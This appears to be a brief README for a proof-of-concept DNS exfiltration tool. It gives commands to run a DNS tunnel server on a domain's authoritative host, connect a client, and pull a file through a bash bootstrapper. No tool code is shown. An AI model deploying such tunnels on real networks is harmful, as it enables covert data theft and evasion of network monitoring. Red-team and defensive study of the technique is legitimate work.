# DNS-Exfil
PoC DNS exfiltration tool with bash bootstrap and file transfer functions

the dns tunnel server is intended to run on a server which can be the
the SOA for a domain or subdomain.

on the server:
# python dnstun.py --domain <SOA record name>

on the client:
$ ./client -s <SOA record name>

downloading a file name "test" from the server using the bash bootstrapper
./bootstrap_file_transfer.sh test

